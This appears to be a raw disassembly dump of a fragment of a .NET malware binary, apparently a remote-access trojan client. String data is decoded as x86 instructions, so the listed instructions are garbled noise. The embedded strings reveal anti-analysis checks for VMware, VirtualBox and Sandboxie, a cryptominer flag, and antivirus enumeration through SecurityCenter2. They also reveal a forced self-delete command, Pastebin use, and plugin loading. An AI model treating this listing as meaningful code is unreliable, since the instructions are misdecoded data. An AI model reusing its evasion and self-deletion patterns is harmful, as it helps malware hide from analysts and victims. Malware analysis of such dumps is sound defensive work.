  40be07:	00 52 00             	add    %dl,0x0(%edx)
  40be0a:	54                   	push   %esp
  40be0b:	00 20                	add    %ah,(%eax)
  40be0d:	00 22                	add    %ah,(%edx)
  40be0f:	00 22                	add    %ah,(%edx)
  40be11:	00 20                	add    %ah,(%eax)
  40be13:	00 22                	add    %ah,(%edx)
  40be15:	00 00                	add    %al,(%eax)
  40be17:	07                   	pop    %es
  40be18:	43                   	inc    %ebx
  40be19:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40be1d:	00 00                	add    %al,(%eax)
  40be1f:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40be23:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40be27:	00 22                	add    %ah,(%edx)
  40be29:	00 00                	add    %al,(%eax)
  40be2b:	0f 22 00             	mov    %eax,%cr0
  40be2e:	20 00                	and    %al,(%eax)
  40be30:	2f                   	das
  40be31:	00 66 00             	add    %ah,0x0(%esi)
  40be34:	20 00                	and    %al,(%eax)
  40be36:	2f                   	das
  40be37:	00 71 00             	add    %dh,0x0(%ecx)
  40be3a:	00 05 78 00 70 00    	add    %al,0x700078
  40be40:	00 45 53             	add    %al,0x53(%ebp)
  40be43:	00 65 00             	add    %ah,0x0(%ebp)
  40be46:	6c                   	insb   (%dx),%es:(%edi)
  40be47:	00 65 00             	add    %ah,0x0(%ebp)
  40be4a:	63 00                	arpl   %eax,(%eax)
  40be4c:	74 00                	je     0x40be4e
  40be4e:	20 00                	and    %al,(%eax)
  40be50:	2a 00                	sub    (%eax),%al
  40be52:	20 00                	and    %al,(%eax)
  40be54:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40be58:	6f                   	outsl  %ds:(%esi),(%dx)
  40be59:	00 6d 00             	add    %ch,0x0(%ebp)
  40be5c:	20 00                	and    %al,(%eax)
  40be5e:	57                   	push   %edi
  40be5f:	00 69 00             	add    %ch,0x0(%ecx)
  40be62:	6e                   	outsb  %ds:(%esi),(%dx)
  40be63:	00 33                	add    %dh,(%ebx)
  40be65:	00 32                	add    %dh,(%edx)
  40be67:	00 5f 00             	add    %bl,0x0(%edi)
  40be6a:	43                   	inc    %ebx
  40be6b:	00 6f 00             	add    %ch,0x0(%edi)
  40be6e:	6d                   	insl   (%dx),%es:(%edi)
  40be6f:	00 70 00             	add    %dh,0x0(%eax)
  40be72:	75 00                	jne    0x40be74
  40be74:	74 00                	je     0x40be76
  40be76:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40be7a:	53                   	push   %ebx
  40be7b:	00 79 00             	add    %bh,0x0(%ecx)
  40be7e:	73 00                	jae    0x40be80
  40be80:	74 00                	je     0x40be82
  40be82:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40be86:	00 19                	add    %bl,(%ecx)
  40be88:	4d                   	dec    %ebp
  40be89:	00 61 00             	add    %ah,0x0(%ecx)
  40be8c:	6e                   	outsb  %ds:(%esi),(%dx)
  40be8d:	00 75 00             	add    %dh,0x0(%ebp)
  40be90:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40be94:	63 00                	arpl   %eax,(%eax)
  40be96:	74 00                	je     0x40be98
  40be98:	75 00                	jne    0x40be9a
  40be9a:	72 00                	jb     0x40be9c
  40be9c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bea0:	00 2b                	add    %ch,(%ebx)
  40bea2:	6d                   	insl   (%dx),%es:(%edi)
  40bea3:	00 69 00             	add    %ch,0x0(%ecx)
  40bea6:	63 00                	arpl   %eax,(%eax)
  40bea8:	72 00                	jb     0x40beaa
  40beaa:	6f                   	outsl  %ds:(%esi),(%dx)
  40beab:	00 73 00             	add    %dh,0x0(%ebx)
  40beae:	6f                   	outsl  %ds:(%esi),(%dx)
  40beaf:	00 66 00             	add    %ah,0x0(%esi)
  40beb2:	74 00                	je     0x40beb4
  40beb4:	20 00                	and    %al,(%eax)
  40beb6:	63 00                	arpl   %eax,(%eax)
  40beb8:	6f                   	outsl  %ds:(%esi),(%dx)
  40beb9:	00 72 00             	add    %dh,0x0(%edx)
  40bebc:	70 00                	jo     0x40bebe
  40bebe:	6f                   	outsl  %ds:(%esi),(%dx)
  40bebf:	00 72 00             	add    %dh,0x0(%edx)
  40bec2:	61                   	popa
  40bec3:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bec7:	00 6f 00             	add    %ch,0x0(%edi)
  40beca:	6e                   	outsb  %ds:(%esi),(%dx)
  40becb:	00 00                	add    %al,(%eax)
  40becd:	0b 4d 00             	or     0x0(%ebp),%ecx
  40bed0:	6f                   	outsl  %ds:(%esi),(%dx)
  40bed1:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bed5:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bed9:	0f 56 00             	orps   (%eax),%xmm0
  40bedc:	49                   	dec    %ecx
  40bedd:	00 52 00             	add    %dl,0x0(%edx)
  40bee0:	54                   	push   %esp
  40bee1:	00 55 00             	add    %dl,0x0(%ebp)
  40bee4:	41                   	inc    %ecx
  40bee5:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40bee9:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40beee:	77 00                	ja     0x40bef0
  40bef0:	61                   	popa
  40bef1:	00 72 00             	add    %dh,0x0(%edx)
  40bef4:	65 00 00             	add    %al,%gs:(%eax)
  40bef7:	15 56 00 69 00       	adc    $0x690056,%eax
  40befc:	72 00                	jb     0x40befe
  40befe:	74 00                	je     0x40bf00
  40bf00:	75 00                	jne    0x40bf02
  40bf02:	61                   	popa
  40bf03:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40bf07:	00 6f 00             	add    %ch,0x0(%edi)
  40bf0a:	78 00                	js     0x40bf0c
  40bf0c:	00 17                	add    %dl,(%edi)
  40bf0e:	53                   	push   %ebx
  40bf0f:	00 62 00             	add    %ah,0x0(%edx)
  40bf12:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40bf18:	6c                   	insb   (%dx),%es:(%edi)
  40bf19:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bf1d:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40bf21:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40bf25:	1f                   	pop    %ds
  40bf26:	2d 00 2d 00 64       	sub    $0x64002d00,%eax
  40bf2b:	00 6f 00             	add    %ch,0x0(%edi)
  40bf2e:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf2f:	00 61 00             	add    %ah,0x0(%ecx)
  40bf32:	74 00                	je     0x40bf34
  40bf34:	65 00 2d 00 6c 00 65 	add    %ch,%gs:0x65006c00
  40bf3b:	00 76 00             	add    %dh,0x0(%esi)
  40bf3e:	65 00 6c 00 3d       	add    %ch,%gs:0x3d(%eax,%eax,1)
  40bf43:	00 01                	add    %al,(%ecx)
  40bf45:	03 31                	add    (%ecx),%esi
  40bf47:	00 00                	add    %al,(%eax)
  40bf49:	71 53                	jno    0x40bf9e
  40bf4b:	00 45 00             	add    %al,0x0(%ebp)
  40bf4e:	4c                   	dec    %esp
  40bf4f:	00 45 00             	add    %al,0x0(%ebp)
  40bf52:	43                   	inc    %ebx
  40bf53:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bf57:	00 43 00             	add    %al,0x0(%ebx)
  40bf5a:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf5b:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf5e:	6d                   	insl   (%dx),%es:(%edi)
  40bf5f:	00 61 00             	add    %ah,0x0(%ecx)
  40bf62:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf63:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40bf67:	00 69 00             	add    %ch,0x0(%ecx)
  40bf6a:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf6b:	00 65 00             	add    %ah,0x0(%ebp)
  40bf6e:	20 00                	and    %al,(%eax)
  40bf70:	46                   	inc    %esi
  40bf71:	00 52 00             	add    %dl,0x0(%edx)
  40bf74:	4f                   	dec    %edi
  40bf75:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf78:	20 00                	and    %al,(%eax)
  40bf7a:	57                   	push   %edi
  40bf7b:	00 69 00             	add    %ch,0x0(%ecx)
  40bf7e:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf7f:	00 33                	add    %dh,(%ebx)
  40bf81:	00 32                	add    %dh,(%edx)
  40bf83:	00 5f 00             	add    %bl,0x0(%edi)
  40bf86:	50                   	push   %eax
  40bf87:	00 72 00             	add    %dh,0x0(%edx)
  40bf8a:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf8b:	00 63 00             	add    %ah,0x0(%ebx)
  40bf8e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bf92:	73 00                	jae    0x40bf94
  40bf94:	20 00                	and    %al,(%eax)
  40bf96:	57                   	push   %edi
  40bf97:	00 48 00             	add    %cl,0x0(%eax)
  40bf9a:	45                   	inc    %ebp
  40bf9b:	00 52 00             	add    %dl,0x0(%edx)
  40bf9e:	45                   	inc    %ebp
  40bf9f:	00 20                	add    %ah,(%eax)
  40bfa1:	00 50 00             	add    %dl,0x0(%eax)
  40bfa4:	72 00                	jb     0x40bfa6
  40bfa6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bfa7:	00 63 00             	add    %ah,0x0(%ebx)
  40bfaa:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bfae:	73 00                	jae    0x40bfb0
  40bfb0:	49                   	dec    %ecx
  40bfb1:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bfb5:	00 3d 00 20 00 00    	add    %bh,0x2000
  40bfbb:	17                   	pop    %ss
  40bfbc:	43                   	inc    %ebx
  40bfbd:	00 6f 00             	add    %ch,0x0(%edi)
  40bfc0:	6d                   	insl   (%dx),%es:(%edi)
  40bfc1:	00 6d 00             	add    %ch,0x0(%ebp)
  40bfc4:	61                   	popa
  40bfc5:	00 6e 00             	add    %ch,0x0(%esi)
  40bfc8:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  40bfcd:	00 6e 00             	add    %ch,0x0(%esi)
  40bfd0:	65 00 00             	add    %al,%gs:(%eax)
  40bfd3:	11 45 00             	adc    %eax,0x0(%ebp)
  40bfd6:	72 00                	jb     0x40bfd8
  40bfd8:	72 00                	jb     0x40bfda
  40bfda:	20 00                	and    %al,(%eax)
  40bfdc:	48                   	dec    %eax
  40bfdd:	00 57 00             	add    %dl,0x0(%edi)
  40bfe0:	49                   	dec    %ecx
  40bfe1:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40bfe5:	05 78 00 32 00       	add    $0x320078,%eax
  40bfea:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40bff0:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40bff6:	74 00                	je     0x40bff8
  40bff8:	49                   	dec    %ecx
  40bff9:	00 6e 00             	add    %ch,0x0(%esi)
  40bffc:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c000:	00 09                	add    %cl,(%ecx)
  40c002:	48                   	dec    %eax
  40c003:	00 57 00             	add    %dl,0x0(%edi)
  40c006:	49                   	dec    %ecx
  40c007:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c00b:	09 55 00             	or     %edx,0x0(%ebp)
  40c00e:	73 00                	jae    0x40c010
  40c010:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c014:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c01a:	00 13                	add    %dl,(%ebx)
  40c01c:	4d                   	dec    %ebp
  40c01d:	00 69 00             	add    %ch,0x0(%ecx)
  40c020:	63 00                	arpl   %eax,(%eax)
  40c022:	72 00                	jb     0x40c024
  40c024:	6f                   	outsl  %ds:(%esi),(%dx)
  40c025:	00 73 00             	add    %dh,0x0(%ebx)
  40c028:	6f                   	outsl  %ds:(%esi),(%dx)
  40c029:	00 66 00             	add    %ah,0x0(%esi)
  40c02c:	74 00                	je     0x40c02e
  40c02e:	00 03                	add    %al,(%ebx)
  40c030:	20 00                	and    %al,(%eax)
  40c032:	00 09                	add    %cl,(%ecx)
  40c034:	54                   	push   %esp
  40c035:	00 72 00             	add    %dh,0x0(%edx)
  40c038:	75 00                	jne    0x40c03a
  40c03a:	65 00 00             	add    %al,%gs:(%eax)
  40c03d:	0b 36                	or     (%esi),%esi
  40c03f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c042:	62 00                	bound  %eax,(%eax)
  40c044:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c04a:	46                   	inc    %esi
  40c04b:	00 61 00             	add    %ah,0x0(%ecx)
  40c04e:	6c                   	insb   (%dx),%es:(%edi)
  40c04f:	00 73 00             	add    %dh,0x0(%ebx)
  40c052:	65 00 00             	add    %al,%gs:(%eax)
  40c055:	0b 33                	or     (%ebx),%esi
  40c057:	00 32                	add    %dh,(%edx)
  40c059:	00 62 00             	add    %ah,0x0(%edx)
  40c05c:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c062:	50                   	push   %eax
  40c063:	00 61 00             	add    %ah,0x0(%ecx)
  40c066:	74 00                	je     0x40c068
  40c068:	68 00 00 0f 56       	push   $0x560f0000
  40c06d:	00 65 00             	add    %ah,0x0(%ebp)
  40c070:	72 00                	jb     0x40c072
  40c072:	73 00                	jae    0x40c074
  40c074:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c07a:	00 0b                	add    %cl,(%ebx)
  40c07c:	41                   	inc    %ecx
  40c07d:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c081:	00 69 00             	add    %ch,0x0(%ecx)
  40c084:	6e                   	outsb  %ds:(%esi),(%dx)
  40c085:	00 00                	add    %al,(%eax)
  40c087:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c08b:	00 75 00             	add    %dh,0x0(%ebp)
  40c08e:	65 00 00             	add    %al,%gs:(%eax)
  40c091:	0b 66 00             	or     0x0(%esi),%esp
  40c094:	61                   	popa
  40c095:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c099:	00 65 00             	add    %ah,0x0(%ebp)
  40c09c:	00 17                	add    %dl,(%edi)
  40c09e:	50                   	push   %eax
  40c09f:	00 65 00             	add    %ah,0x0(%ebp)
  40c0a2:	72 00                	jb     0x40c0a4
  40c0a4:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c0a8:	72 00                	jb     0x40c0aa
  40c0aa:	6d                   	insl   (%dx),%es:(%edi)
  40c0ab:	00 61 00             	add    %ah,0x0(%ecx)
  40c0ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0af:	00 63 00             	add    %ah,0x0(%ebx)
  40c0b2:	65 00 00             	add    %al,%gs:(%eax)
  40c0b5:	11 50 00             	adc    %edx,0x0(%eax)
  40c0b8:	61                   	popa
  40c0b9:	00 73 00             	add    %dh,0x0(%ebx)
  40c0bc:	74 00                	je     0x40c0be
  40c0be:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c0c2:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c0c8:	41                   	inc    %ecx
  40c0c9:	00 6e 00             	add    %ch,0x0(%esi)
  40c0cc:	74 00                	je     0x40c0ce
  40c0ce:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c0d4:	72 00                	jb     0x40c0d6
  40c0d6:	75 00                	jne    0x40c0d8
  40c0d8:	73 00                	jae    0x40c0da
  40c0da:	00 13                	add    %dl,(%ebx)
  40c0dc:	49                   	dec    %ecx
  40c0dd:	00 6e 00             	add    %ch,0x0(%esi)
  40c0e0:	73 00                	jae    0x40c0e2
  40c0e2:	74 00                	je     0x40c0e4
  40c0e4:	61                   	popa
  40c0e5:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c0e9:	00 65 00             	add    %ah,0x0(%ebp)
  40c0ec:	64 00 00             	add    %al,%fs:(%eax)
  40c0ef:	09 50 00             	or     %edx,0x0(%eax)
  40c0f2:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0f3:	00 6e 00             	add    %ch,0x0(%esi)
  40c0f6:	67 00 00             	add    %al,(%bx,%si)
  40c0f9:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  40c0fe:	00 2b                	add    %ch,(%ebx)
  40c100:	5c                   	pop    %esp
  40c101:	00 72 00             	add    %dh,0x0(%edx)
  40c104:	6f                   	outsl  %ds:(%esi),(%dx)
  40c105:	00 6f 00             	add    %ch,0x0(%edi)
  40c108:	74 00                	je     0x40c10a
  40c10a:	5c                   	pop    %esp
  40c10b:	00 53 00             	add    %dl,0x0(%ebx)
  40c10e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c112:	75 00                	jne    0x40c114
  40c114:	72 00                	jb     0x40c116
  40c116:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c11c:	43                   	inc    %ebx
  40c11d:	00 65 00             	add    %ah,0x0(%ebp)
  40c120:	6e                   	outsb  %ds:(%esi),(%dx)
  40c121:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c125:	00 72 00             	add    %dh,0x0(%edx)
  40c128:	32 00                	xor    (%eax),%al
  40c12a:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c130:	6c                   	insb   (%dx),%es:(%edi)
  40c131:	00 65 00             	add    %ah,0x0(%ebp)
  40c134:	63 00                	arpl   %eax,(%eax)
  40c136:	74 00                	je     0x40c138
  40c138:	20 00                	and    %al,(%eax)
  40c13a:	2a 00                	sub    (%eax),%al
  40c13c:	20 00                	and    %al,(%eax)
  40c13e:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c142:	6f                   	outsl  %ds:(%esi),(%dx)
  40c143:	00 6d 00             	add    %ch,0x0(%ebp)
  40c146:	20 00                	and    %al,(%eax)
  40c148:	41                   	inc    %ecx
  40c149:	00 6e 00             	add    %ch,0x0(%esi)
  40c14c:	74 00                	je     0x40c14e
  40c14e:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c154:	72 00                	jb     0x40c156
  40c156:	75 00                	jne    0x40c158
  40c158:	73 00                	jae    0x40c15a
  40c15a:	50                   	push   %eax
  40c15b:	00 72 00             	add    %dh,0x0(%edx)
  40c15e:	6f                   	outsl  %ds:(%esi),(%dx)
  40c15f:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c163:	00 63 00             	add    %ah,0x0(%ebx)
  40c166:	74 00                	je     0x40c168
  40c168:	00 17                	add    %dl,(%edi)
  40c16a:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c16e:	73 00                	jae    0x40c170
  40c170:	70 00                	jo     0x40c172
  40c172:	6c                   	insb   (%dx),%es:(%edi)
  40c173:	00 61 00             	add    %ah,0x0(%ecx)
  40c176:	79 00                	jns    0x40c178
  40c178:	4e                   	dec    %esi
  40c179:	00 61 00             	add    %ah,0x0(%ecx)
  40c17c:	6d                   	insl   (%dx),%es:(%edi)
  40c17d:	00 65 00             	add    %ah,0x0(%ebp)
  40c180:	00 07                	add    %al,(%edi)
  40c182:	4e                   	dec    %esi
  40c183:	00 2f                	add    %ch,(%edi)
  40c185:	00 41 00             	add    %al,0x0(%ecx)
  40c188:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c18e:	00 13                	add    %dl,(%ebx)
  40c190:	53                   	push   %ebx
  40c191:	00 6f 00             	add    %ch,0x0(%edi)
  40c194:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c199:	00 61 00             	add    %ah,0x0(%ecx)
  40c19c:	72 00                	jb     0x40c19e
  40c19e:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c1a3:	09 70 00             	or     %esi,0x0(%eax)
  40c1a6:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1a7:	00 6e 00             	add    %ch,0x0(%esi)
  40c1aa:	67 00 00             	add    %al,(%bx,%si)
  40c1ad:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c1b2:	75 00                	jne    0x40c1b4
  40c1b4:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c1b8:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1b9:	00 00                	add    %al,(%eax)
  40c1bb:	15 73 00 61 00       	adc    $0x610073,%eax
  40c1c0:	76 00                	jbe    0x40c1c2
  40c1c2:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c1c6:	6c                   	insb   (%dx),%es:(%edi)
  40c1c7:	00 75 00             	add    %dh,0x0(%ebp)
  40c1ca:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c1ce:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1cf:	00 00                	add    %al,(%eax)
  40c1d1:	07                   	pop    %es
  40c1d2:	44                   	inc    %esp
  40c1d3:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c1d7:	00 00                	add    %al,(%eax)
  40c1d9:	15 73 00 65 00       	adc    $0x650073,%eax
  40c1de:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1df:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c1e3:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c1e7:	00 67 00             	add    %ah,0x0(%edi)
  40c1ea:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c1f0:	48                   	dec    %eax
  40c1f1:	00 61 00             	add    %ah,0x0(%ecx)
  40c1f4:	73 00                	jae    0x40c1f6
  40c1f6:	68 00 65 00 73       	push   $0x73006500
  40c1fb:	00 00                	add    %al,(%eax)
  40c1fd:	09 48 00             	or     %ecx,0x0(%eax)
  40c200:	61                   	popa
  40c201:	00 73 00             	add    %dh,0x0(%ebx)
  40c204:	68 00 00 1b 50       	push   $0x501b0000
  40c209:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c20d:	00 67 00             	add    %ah,0x0(%edi)
  40c210:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c216:	50                   	push   %eax
  40c217:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c21b:	00 67 00             	add    %ah,0x0(%edi)
  40c21e:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c224:	52                   	push   %edx
  40c225:	00 75 00             	add    %dh,0x0(%ebp)
  40c228:	6e                   	outsb  %ds:(%esi),(%dx)
  40c229:	00 00                	add    %al,(%eax)
  40c22b:	0f 4d 00             	cmovge (%eax),%eax
  40c22e:	73 00                	jae    0x40c230
  40c230:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c234:	61                   	popa
  40c235:	00 63 00             	add    %ah,0x0(%ebx)
  40c238:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c23b:	11 52 00             	adc    %edx,0x0(%edx)
  40c23e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c242:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c246:	76 00                	jbe    0x40c248
  40c248:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c24d:	0b 45 00             	or     0x0(%ebp),%eax
  40c250:	72 00                	jb     0x40c252
  40c252:	72 00                	jb     0x40c254
  40c254:	6f                   	outsl  %ds:(%esi),(%dx)
  40c255:	00 72 00             	add    %dh,0x0(%edx)
  40c258:	00 47 6d             	add    %al,0x6d(%edi)
  40c25b:	00 61 00             	add    %ah,0x0(%ecx)
  40c25e:	73 00                	jae    0x40c260
  40c260:	74 00                	je     0x40c262
  40c262:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c266:	4b                   	dec    %ebx
  40c267:	00 65 00             	add    %ah,0x0(%ebp)
  40c26a:	79 00                	jns    0x40c26c
  40c26c:	20 00                	and    %al,(%eax)
  40c26e:	63 00                	arpl   %eax,(%eax)
  40c270:	61                   	popa
  40c271:	00 6e 00             	add    %ch,0x0(%esi)
  40c274:	20 00                	and    %al,(%eax)
  40c276:	6e                   	outsb  %ds:(%esi),(%dx)
  40c277:	00 6f 00             	add    %ch,0x0(%edi)
  40c27a:	74 00                	je     0x40c27c
  40c27c:	20 00                	and    %al,(%eax)
  40c27e:	62 00                	bound  %eax,(%eax)
  40c280:	65 00 20             	add    %ah,%gs:(%eax)
  40c283:	00 6e 00             	add    %ch,0x0(%esi)
  40c286:	75 00                	jne    0x40c288
  40c288:	6c                   	insb   (%dx),%es:(%edi)
  40c289:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c28d:	00 6f 00             	add    %ch,0x0(%edi)
  40c290:	72 00                	jb     0x40c292
  40c292:	20 00                	and    %al,(%eax)
  40c294:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c298:	70 00                	jo     0x40c29a
  40c29a:	74 00                	je     0x40c29c
  40c29c:	79 00                	jns    0x40c29e
  40c29e:	2e 00 00             	add    %al,%cs:(%eax)
  40c2a1:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c2a6:	70 00                	jo     0x40c2a8
  40c2a8:	75 00                	jne    0x40c2aa
  40c2aa:	74 00                	je     0x40c2ac
  40c2ac:	20 00                	and    %al,(%eax)
  40c2ae:	63 00                	arpl   %eax,(%eax)
  40c2b0:	61                   	popa
  40c2b1:	00 6e 00             	add    %ch,0x0(%esi)
  40c2b4:	20 00                	and    %al,(%eax)
  40c2b6:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2b7:	00 6f 00             	add    %ch,0x0(%edi)
  40c2ba:	74 00                	je     0x40c2bc
  40c2bc:	20 00                	and    %al,(%eax)
  40c2be:	62 00                	bound  %eax,(%eax)
  40c2c0:	65 00 20             	add    %ah,%gs:(%eax)
  40c2c3:	00 6e 00             	add    %ch,0x0(%esi)
  40c2c6:	75 00                	jne    0x40c2c8
  40c2c8:	6c                   	insb   (%dx),%es:(%edi)
  40c2c9:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c2cd:	00 00                	add    %al,(%eax)
  40c2cf:	55                   	push   %ebp
  40c2d0:	49                   	dec    %ecx
  40c2d1:	00 6e 00             	add    %ch,0x0(%esi)
  40c2d4:	76 00                	jbe    0x40c2d6
  40c2d6:	61                   	popa
  40c2d7:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c2db:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c2df:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2e2:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c2e6:	73 00                	jae    0x40c2e8
  40c2e8:	61                   	popa
  40c2e9:	00 67 00             	add    %ah,0x0(%edi)
  40c2ec:	65 00 20             	add    %ah,%gs:(%eax)
  40c2ef:	00 61 00             	add    %ah,0x0(%ecx)
  40c2f2:	75 00                	jne    0x40c2f4
  40c2f4:	74 00                	je     0x40c2f6
  40c2f6:	68 00 65 00 6e       	push   $0x6e006500
  40c2fb:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c2ff:	00 63 00             	add    %ah,0x0(%ebx)
  40c302:	61                   	popa
  40c303:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c307:	00 6f 00             	add    %ch,0x0(%edi)
  40c30a:	6e                   	outsb  %ds:(%esi),(%dx)
  40c30b:	00 20                	add    %ah,(%eax)
  40c30d:	00 63 00             	add    %ah,0x0(%ebx)
  40c310:	6f                   	outsl  %ds:(%esi),(%dx)
  40c311:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c315:	00 20                	add    %ah,(%eax)
  40c317:	00 28                	add    %ch,(%eax)
  40c319:	00 4d 00             	add    %cl,0x0(%ebp)
  40c31c:	41                   	inc    %ecx
  40c31d:	00 43 00             	add    %al,0x0(%ebx)
  40c320:	29 00                	sub    %eax,(%eax)
  40c322:	2e 00 00             	add    %al,%cs:(%eax)
  40c325:	05 58 00 32 00       	add    $0x320058,%eax
  40c32a:	00 00                	add    %al,(%eax)
  40c32c:	36 9d                	ss popf
  40c32e:	ff a4 36 e0 75 45 af 	jmp    *-0x50ba8a20(%esi,%esi,1)
  40c335:	eb 5b                	jmp    0x40c392
  40c337:	54                   	push   %esp
  40c338:	8a a7 3f 24 00 08    	mov    0x800243f(%edi),%ah
  40c33e:	b7 7a                	mov    $0x7a,%bh
  40c340:	5c                   	pop    %esp
  40c341:	56                   	push   %esi
  40c342:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c345:	89 03                	mov    %eax,(%ebx)
  40c347:	00 00                	add    %al,(%eax)
  40c349:	01 03                	add    %eax,(%ebx)
  40c34b:	20 00                	and    %al,(%eax)
  40c34d:	01 02                	add    %eax,(%edx)
  40c34f:	06                   	push   %es
  40c350:	0e                   	push   %cs
  40c351:	03 06                	add    (%esi),%eax
  40c353:	12 09                	adc    (%ecx),%cl
  40c355:	03 06                	add    (%esi),%eax
  40c357:	12 60 03             	adc    0x3(%eax),%ah
  40c35a:	00 00                	add    %al,(%eax)
  40c35c:	02 03                	add    (%ebx),%al
  40c35e:	06                   	push   %es
  40c35f:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c365:	03 06                	add    (%esi),%eax
  40c367:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c36c:	03 06                	add    (%esi),%eax
  40c36e:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c374:	06                   	push   %es
  40c375:	1c 02                	sbb    $0x2,%al
  40c377:	06                   	push   %es
  40c378:	08 04 00             	or     %al,(%eax,%eax,1)
  40c37b:	00 12                	add    %dl,(%edx)
  40c37d:	0d 05 00 01 01       	or     $0x1010005,%eax
